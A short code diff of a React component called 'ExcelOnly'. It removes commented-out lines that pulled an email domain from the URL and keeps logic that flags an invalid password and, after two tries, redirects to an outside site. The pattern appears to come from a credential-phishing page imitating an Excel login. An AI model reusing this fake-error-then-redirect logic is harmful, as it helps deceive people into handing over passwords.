@@ -37,10 +37,6 @@ function ExcelOnly() {
         setInvalidPassword(true);
         setCount(count=> count + 1);
         if(count >= 2){
-          // const redirectURL = window.location.href;
-          // const sliceEqualSign = redirectURL.indexOf("@");
-          // const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
-          // console.log(extracetdemailDomain);
           window.location.href = "https://www.seed.net.tw/";
       }
       }, 2500);
